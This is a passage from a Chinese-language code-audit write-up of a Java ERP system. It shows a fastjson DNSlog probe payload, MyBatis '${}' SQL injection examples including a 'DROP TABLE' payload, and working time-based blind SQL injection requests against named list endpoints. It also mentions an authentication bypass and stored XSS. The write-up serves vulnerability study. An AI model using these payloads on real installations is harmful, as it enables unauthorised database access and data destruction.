class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201351506.png"></p><h4 id="断点调试："><a href="#断点调试：" class="headerlink" title="断点调试："></a>断点调试：</h4><p>调试过程基本和“分析链”中一致，</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201351332.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201351023.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201351524.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201351288.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201352184.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201352076.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201352144.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201352547.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201352250.png"></p><p><font style="color:rgb(34, 34, 38);"></font></p><blockquote><p><font style="color:rgb(34, 34, 38);">通过dnslog探测fastjson的几种方法（</font>java.net.Inet4Address、Inet6Address、InetSocketAddress，url）</p><p><a href="https://blog.csdn.net/Adminxe/article/details/105918000">https://blog.csdn.net/Adminxe/article/details/105918000</a></p></blockquote><h4 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java">HTTP GET 请求 ：/user/list?search=&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.net.Inet4Address&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;xxx.dnslog.cn&quot;</span>&#125;<br>-&gt;ResourceController.java<br><span class="hljs-title function_">getList</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable(&quot;apiName&quot;)</span> String apiName,</span><br><span class="hljs-params">                        <span class="hljs-meta">@RequestParam(value = Constants.PAGE_SIZE, required = false)</span> Integer pageSize,</span><br><span class="hljs-params">                        <span class="hljs-meta">@RequestParam(value = Constants.CURRENT_PAGE, required = false)</span> Integer currentPage,</span><br><span class="hljs-params">                        <span class="hljs-meta">@RequestParam(value = Constants.SEARCH, required = false)</span> String search,</span><br><span class="hljs-params">                        HttpServletRequest request)</span><br>-&gt;UserComponent.java<br>getUserList#getInfo(search)<br>-&gt;<br>JSONObject.parseObject(search)<br>-&gt;<br>DefaultJSONParser<br>-&gt;<br>parse <br>-&gt;<br>checkAutoType<br>-&gt;<br>loadClass<br>-&gt;<br>TypeUtils.loadClass<br>-&gt;<br>config.getDeserializers().get(clazz)<br>-&gt;<br>Inet4Address<br>-&gt;<br>MiscCodec#ObjectDeserializer<br>-&gt;<br><span class="hljs-keyword">return</span> InetAddress.getByName(strVal); <span class="hljs-comment">//将strVal作为主机名,获取其对应的ip，域名在此处被解析</span><br></code></pre></td></tr></table></figure><h3 id="2-2-log4j-（不存在）"><a href="#2-2-log4j-（不存在）" class="headerlink" title="2.2 log4j （不存在）"></a>2.2 log4j （不存在）</h3><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201353028.png"></p><p>并没有导入 log4j-core 包，单独的 log4j-to-slf4j  是不存在漏洞的</p><p><code>log4j-to-slf4j</code> 是一个 <strong>桥接器（bridge）</strong>，它把 Log4j 2 API 的调用转发到 SLF4J，由 SLF4J 来真正打印  </p><h3 id="2-3-MyBatis-CVE-2020-26945（不存在）"><a href="#2-3-MyBatis-CVE-2020-26945（不存在）" class="headerlink" title="2.3 MyBatis CVE-2020-26945（不存在）"></a>2.3 MyBatis <strong><font style="color:rgba(0, 0, 0, 0.85);">CVE-2020-26945（不存在）</font></strong></h3><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201353100.png"></p><h4 id="漏洞点分析："><a href="#漏洞点分析：" class="headerlink" title="漏洞点分析："></a>漏洞点分析：</h4><p><font style="color:rgb(51, 51, 51);">SerializedCache#deserialize()</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getObject</span><span class="hljs-params">(Object key)</span> &#123;<br>    <span class="hljs-comment">//从底层的 delegate（被代理的对象，一般是一个缓存或Map）中取值</span><br>    <span class="hljs-type">Object</span> <span class="hljs-variable">object</span> <span class="hljs-operator">=</span> delegate.getObject(key);<br>    <span class="hljs-comment">// 如果取到的值是 null(过期)，直接返回 null；</span><br>    <span class="hljs-comment">// 否则将取到的值强转为 byte[]，再调用 deserialize 方法反序列化，恢复成原来的对象</span><br>    <span class="hljs-comment">//deserialize((byte[]) object) 就是 RCE 的触发点了</span><br>    <span class="hljs-keyword">return</span> object == <span class="hljs-literal">null</span> ? <span class="hljs-literal">null</span> : deserialize((<span class="hljs-type">byte</span>[]) object);<br>&#125;<br></code></pre></td></tr></table></figure><p>跟进 delegate.getObject</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Cache</span> &#123;<br>    ...<br>    Object <span class="hljs-title function_">getObject</span><span class="hljs-params">(Object key)</span>;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><p>getObject    ctrl+alt+左键 转到声明</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201353445.png"></p><p> 跟进到 ScheduledCache  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getObject</span><span class="hljs-params">(Object key)</span> &#123;<br>    <span class="hljs-comment">//clearWhenStale() 检查缓存是否“过期”</span><br>    <span class="hljs-keyword">return</span> clearWhenStale() ? <span class="hljs-literal">null</span> : delegate.getObject(key);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">clearWhenStale</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">if</span> (System.currentTimeMillis() - lastClear &gt; clearInterval) &#123;<br>        clear();<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a><font style="color:rgb(34, 34, 34);">利用条件</font></h4><ol><li><font style="color:rgb(53, 53, 53);">用户启用了二级缓存功能</font></li></ol><blockquote><p><font style="color:rgb(53, 53, 53);">二级缓存其实就是将查询的结果，放入缓存中，下次查询相同的条件时，直接从缓存中获取结果，降低sql服务器的压力</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201353146.png"></p></blockquote><ol start="2"><li><font style="color:rgb(53, 53, 53);">攻击者可以修改缓存的内容，替换为恶意反序列化数据</font></li><li><font style="color:rgb(53, 53, 53);">用户未设置JEP-290过滤，且没有任何防御反序列化攻击的措施</font></li></ol><blockquote><p><strong>JEP-290 是从 Java 9 开始引入的</strong>，在 Java 8 里 <strong>不存在全局或类级序列化过滤器</strong> 的机制  </p></blockquote><p><strong>由于找不到可修改的缓存内容，这部分就作为漏洞学习一遍，本系统不存在此漏洞</strong></p><h2 id="接下来的审计按照以下方向进行："><a href="#接下来的审计按照以下方向进行：" class="headerlink" title="接下来的审计按照以下方向进行："></a>接下来的审计按照以下方向进行：</h2><ol><li>SQL 注入</li><li><del>文件安全 （在翻找功能点过程中并没有发现有能上传&amp;读取文件的点）</del></li><li>身份验证&amp;鉴权 （LogCostFilter.java）</li><li>第三方组件&amp;依赖 （已分析）</li></ol><h2 id="3、Mybatis-SQL-注入"><a href="#3、Mybatis-SQL-注入" class="headerlink" title="3、Mybatis SQL 注入"></a>3、Mybatis SQL 注入</h2><p>Mybatis框架的sql注入关注<code>${}</code>：</p><p><code>${}</code>用于直接替换SQL语句中的占位符，而<code>#{}</code>用于预编译</p><ol><li>like模糊查询</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql">xml模板：<br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> username <span class="hljs-keyword">LIKE</span> <span class="hljs-string">&#x27;%$&#123;name&#125;%&#x27;</span><br><br><span class="hljs-keyword">sql</span>注入：<br><span class="hljs-string">&#x27; OR &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span><br><br>执行<span class="hljs-keyword">sql</span>:<br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> username <span class="hljs-keyword">LIKE</span> <span class="hljs-string">&#x27;%%&#x27;</span> <span class="hljs-keyword">OR</span> <span class="hljs-string">&#x27;1&#x27;</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;1%&#x27;</span><br></code></pre></td></tr></table></figure><ol start="2"><li>动态列名 &#x2F; 表名</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql">xml模板：<br><span class="hljs-keyword">SELECT</span> $&#123;<span class="hljs-keyword">column</span>&#125; <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id <span class="hljs-operator">=</span> #&#123;id&#125;<br><br><span class="hljs-keyword">sql</span>注入：<br><span class="hljs-keyword">column</span> <span class="hljs-operator">=</span> &quot;username, password from users --&quot;<br><br>执行<span class="hljs-keyword">sql</span>:<br><span class="hljs-keyword">SELECT</span> username, password <span class="hljs-keyword">from</span> users <span class="hljs-comment">-- FROM users WHERE id = ?</span><br></code></pre></td></tr></table></figure><ol start="3"><li>Order By</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql">xml模板：<br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> $&#123;sortColumn&#125;<br><br><span class="hljs-keyword">sql</span>注入：<br>sortColumn <span class="hljs-operator">=</span> &quot;id; DROP TABLE users --&quot;<br><br>执行<span class="hljs-keyword">sql</span>:<br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> id; <span class="hljs-keyword">DROP</span> <span class="hljs-keyword">TABLE</span> users <span class="hljs-comment">-- </span><br></code></pre></td></tr></table></figure><ol start="4"><li>IN</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql">xml模板：<br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id <span class="hljs-keyword">IN</span> ($&#123;ids&#125;)<br><br><span class="hljs-keyword">sql</span>注入：<br>mapper.findByIds(&quot;1,2,3 OR 1=1&quot;);<br><br>执行<span class="hljs-keyword">sql</span>:<br><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id <span class="hljs-keyword">IN</span> (<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">OR</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><h3 id="AccoutMapperEx-xml"><a href="#AccoutMapperEx-xml" class="headerlink" title="AccoutMapperEx.xml"></a>AccoutMapperEx.xml</h3><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201353446.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201354889.png"></p><p>接下来考虑Controller&#x2F;Service 中是否传入了 name 参数</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201354762.png"></p><p>跟进 <font style="color:#080808;background-color:#ffffff;">select，</font></p><p><font style="color:#080808;background-color:#ffffff;"> 从请求参数 map 中解析搜索条件  </font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201354110.png"></p><p>寻找调用 <font style="color:#080808;background-color:#ffffff;">getAccountList() 的位置</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201354842.png"></p><p>跟进 select</p><p> <font style="color:#080808;background-color:#ffffff;">select(String apiName, Map&lt;String, String&gt; parameterMap) 是</font>整个查询模块的统一入口  </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201354949.png"></p><p>继续跟进，</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201354239.png"></p><p>接下来去找对应的功能点，可以发现，在“基本资料”中都是查询接口，而现在我们需要的是“结算账户”的查询接口，其他的接口也应该存在sql注入，之后查看。</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201354668.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201355700.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201355478.png"></p><p>对“结算账户”的查询点抓包后，正好对应刚才源码中看到的几个参数“<font style="color:#080808;background-color:#ffffff;">name, serialNo, remark</font>”：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201355029.png"></p><p>对 name 参数进行sql注入：</p><p>从结果来看时间盲注成功了</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs html">GET /account/list?search=%7B%22name%22%3A%221%22%2C%22serialNo%22%3A%222%22%2C%22remark%22%3A%223%22%7D&amp;currentPage=1&amp;pageSize=15 HTTP/1.1<br>Host: 169.254.252.28:8123<br>Accept: application/json, text/javascript, */*; q=0.01<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36<br>X-Requested-With: XMLHttpRequest<br>Referer: http://169.254.252.28:8123/pages/manage/account.html<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=0.9<br>Cookie: JSESSIONID=A4E545CEF643F8473838EB799DB320AD; Hm_lvt_1cd9bcbaae133f03a6eb19da6579aaba=1755655005; HMACCOUNT=A245E83F95E74014; Hm_lpvt_1cd9bcbaae133f03a6eb19da6579aaba=1755656817<br>Connection: close<br><br>GET /account/list?search=&#123;&quot;name&quot;:&quot;123&#x27; or sleep(5)--+&quot;,&quot;serialNo&quot;:&quot;2&quot;,&quot;remark&quot;:&quot;3&quot;&#125;&amp;currentPage=1&amp;pageSize=15 HTTP/1.1<br><br>payload：<br>GET /account/list?search=%7B%22name%22%3A%22123%27%20or%20sleep(5)--%2B%22%2C%22serialNo%22%3A%222%22%2C%22remark%22%3A%223%22%7D&amp;currentPage=1&amp;pageSize=15 HTTP/1.1<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201355391.png"></p><p>在Mybatis的日志中， 可以清楚看到 SQL 注入点已经被利用，并且 <strong>时间盲注生效</strong>：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201356858.png"></p><h3 id="DepotMapperEx-xml"><a href="#DepotMapperEx-xml" class="headerlink" title="DepotMapperEx.xml"></a>DepotMapperEx.xml</h3><p>通过上述AccoutMapperEx.xml的审计，可以确定该系统中有多个类似的sql注入点，他们的流程都是一致的。</p><p>再以DepotMapperEx.xml 为例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;select id=&quot;selectByConditionDepot&quot; parameterType=&quot;com.jsh.erp.datasource.entities.DepotExample&quot; resultMap=&quot;ResultMapEx&quot;&gt;<br>  select dep.*,usr.username as principalName<br>  FROM jsh_depot dep<br>  left join jsh_user usr on usr.id=dep.principal and ifnull(usr.status,&#x27;0&#x27;) not in(&#x27;1&#x27;,&#x27;2&#x27;)<br>  where 1=1<br>  &lt;if test=&quot;name != null&quot;&gt;<br>    and dep.name like &#x27;%$&#123;name&#125;%&#x27;<br>  &lt;/if&gt;<br><br>-&gt;selectByConditionDepot<br>public interface DepotMapperEx &#123;<br><br>    List&lt;DepotEx&gt; selectByConditionDepot(<br>            @Param(&quot;name&quot;) String name,<br>            @Param(&quot;type&quot;) Integer type,<br>            @Param(&quot;remark&quot;) String remark,<br>            @Param(&quot;offset&quot;) Integer offset,<br>            @Param(&quot;rows&quot;) Integer rows);<br><br>-&gt;DepotService<br>public List&lt;DepotEx&gt; select(String name, Integer type, String remark, int offset, int rows)throws Exception &#123;<br>        List&lt;DepotEx&gt; list=null;<br>        try&#123;<br>            list=depotMapperEx.selectByConditionDepot(name, type, remark, offset, rows);<br>        &#125;catch(Exception e)&#123;<br>            JshException.readFail(logger, e);<br>        &#125;<br>        return list;<br>    &#125;<br><br>-&gt;select<br>@Override<br>    public List&lt;?&gt; select(Map&lt;String, String&gt; map)throws Exception &#123;<br>        return getDepotList(map);<br>    &#125;<br><br>    private List&lt;?&gt; getDepotList(Map&lt;String, String&gt; map)throws Exception &#123;<br>        String search = map.get(Constants.SEARCH);<br>        String name = StringUtil.getInfo(search, &quot;name&quot;);<br>        Integer type = StringUtil.parseInteger(StringUtil.getInfo(search, &quot;type&quot;));<br>        String remark = StringUtil.getInfo(search, &quot;remark&quot;);<br>        String order = QueryUtils.order(map);<br>        return depotService.select(name, type, remark, QueryUtils.offset(map), QueryUtils.rows(map));<br>    &#125;<br><br>-&gt;select<br> /**<br>     * 查询<br>     * @param apiName<br>     * @param parameterMap<br>     * @return<br>     */<br>    public List&lt;?&gt; select(String apiName, Map&lt;String, String&gt; parameterMap)throws Exception &#123;<br>        if (StringUtil.isNotEmpty(apiName)) &#123;<br>            return container.getCommonQuery(apiName).select(parameterMap);<br>        &#125;<br>        return new ArrayList&lt;Object&gt;();<br>    &#125;<br><br>-&gt;select<br>@GetMapping(value = &quot;/&#123;apiName&#125;/list&quot;)<br>    public String getList(@PathVariable(&quot;apiName&quot;) String apiName,<br>                        @RequestParam(value = Constants.PAGE_SIZE, required = false) Integer pageSize,<br>                        @RequestParam(value = Constants.CURRENT_PAGE, required = false) Integer currentPage,<br>                        @RequestParam(value = Constants.SEARCH, required = false) String search,<br>                        HttpServletRequest request)throws Exception &#123;<br>        Map&lt;String, String&gt; parameterMap = ParamUtils.requestToMap(request);<br>        parameterMap.put(Constants.SEARCH, search);<br>        PageQueryInfo queryInfo = new PageQueryInfo();<br>        Map&lt;String, Object&gt; objectMap = new HashMap&lt;String, Object&gt;();<br>        if (pageSize != null &amp;&amp; pageSize &lt;= 0) &#123;<br>            pageSize = 10;<br>        &#125;<br>        String offset = ParamUtils.getPageOffset(currentPage, pageSize);<br>        if (StringUtil.isNotEmpty(offset)) &#123;<br>            parameterMap.put(Constants.OFFSET, offset);<br>        &#125;<br>        List&lt;?&gt; list = configResourceManager.select(apiName, parameterMap);<br>        objectMap.put(&quot;page&quot;, queryInfo);<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201357198.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201357796.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/52403351/1755660382217-6998767d-c701-40dc-b102-1ac471e6c34e.png"></p><h3 id="小结："><a href="#小结：" class="headerlink" title="小结："></a>小结：</h3><p>通过全局搜索到<code>like &#39;%${name}%&#39;</code>，定位 <code>&lt;select id=&quot;selectByConditionXxxxx&quot;</code>，之后便在 <code>controller</code> 和 <code>service</code> 中找对应的文件名，在其中找到  <code>selectByConditionXxxxx</code> (基本上都在service中)，找到之后会发现 <code>selectByConditionXxxxx</code> 中所需的几个参数，都是来自 <code>select</code> 查询，跟进 <code>select</code> ，找到 <code>getXxxList</code> 方法解析 <code>select(Map&lt;String,String&gt; map)</code> 传入的前端请求参数，跟进 <code>select</code>，发现他是统一接口，通过 <code>apiName</code> 动态调用不同查询。接下来就在前端找对应的功能点，在”基本资料“里可以看到有查询功能，通过抓包或者对应名称来确定需要的接口，例如：<code>GET /account/list?search={&quot;name&quot;:&quot;1&quot;,&quot;serialNo&quot;:&quot;2&quot;,&quot;remark&quot;:&quot;3&quot;}&amp;currentPage=1&amp;pageSize=15 HTTP/1.1</code>，<code>name、serialNo、remark</code> 都是对应的 <code>AccoutMapperEx</code> 的参数，那么就在 <code>name</code> 参数注入。</p><p>同样的漏洞有：</p><ul><li>AccoutMapperEx.xml</li><li>DepotMapperEx.xml </li><li>LogMapperEx.xml （功能点在“系统管理”-“日志管理”）<ul><li>payload : 111’ OR SLEEP(5) OR ‘1’&#x3D;’1</li></ul></li><li><font style="color:#080808;background-color:#ffffff;">MaterialMapperEx.xml（功能点在“商品管理”-“商品信息”）</font></li><li><font style="color:#080808;background-color:#ffffff;">PersonMapperEx.xml（功能点在“基本资料”-“经手人管理”）</font></li><li><font style="color:#080808;background-color:#ffffff;">RoleMapperEx.xml（功能点在“系统管理”-“角色管理”）</font></li><li><font style="color:#080808;background-color:#ffffff;">UnitMapperEx.xml（功能点在“商品管理”-“计量单位”）</font></li><li><font style="color:#080808;background-color:#ffffff;">UserMapperEx.xml（功能点在“系统管理”-“用户管理”）</font></li></ul><h2 id="4、身份验证-鉴权"><a href="#4、身份验证-鉴权" class="headerlink" title="4、身份验证&amp;鉴权"></a>4、身份验证&amp;鉴权</h2><p>这一部分依旧是 LogCostFilter.java 发现的漏洞点，在SQL 注入中，我们登录到后台进行的注入，那么结合鉴权漏洞，就可以未登录进行SQL注入。</p><p>从图片看到，绕过身份验证也可以进行SQL注入</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201357525.png"></p><h1 id="漏洞复现："><a href="#漏洞复现：" class="headerlink" title="漏洞复现："></a>漏洞复现：</h1><h2 id="1、存储型XSS"><a href="#1、存储型XSS" class="headerlink" title="1、存储型XSS"></a>1、<font style="color:rgb(31, 45, 61);">存储型XSS</font></h2><p>很多功能点都存在此漏洞，以下举三例：</p><h3 id="1-1-用户管理"><a href="#1-1-用户管理" class="headerlink" title="1.1 用户管理"></a>1.1 用户管理</h3><p>先新增一个用户</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201357263.png"></p><p>修改用户名</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201357816.png"></p><p>出现弹窗</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201357155.png"></p><p>找到源码：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201357019.png"></p><p>接收前端传入的 info 参数，检查用户数量是否超限，并没有做任何特殊字符过滤，这里就是XSS 的入口点</p><h3 id="1-2-商品信息"><a href="#1-2-商品信息" class="headerlink" title="1.2 商品信息"></a>1.2 商品信息</h3><p>增加商品：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201358852.png"></p><p>五个地方都会弹窗</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201358742.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201358810.png"><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201358804.png"><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201358551.png"><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201358132.png"></p><h3 id="1-3-收入单"><a href="#1-3-收入单" class="headerlink" title="1.3 收入单"></a>1.3 收入单</h3><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201359218.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508201359675.png"></p><h1 id="参考文章："><a href="#参考文章：" class="headerlink" 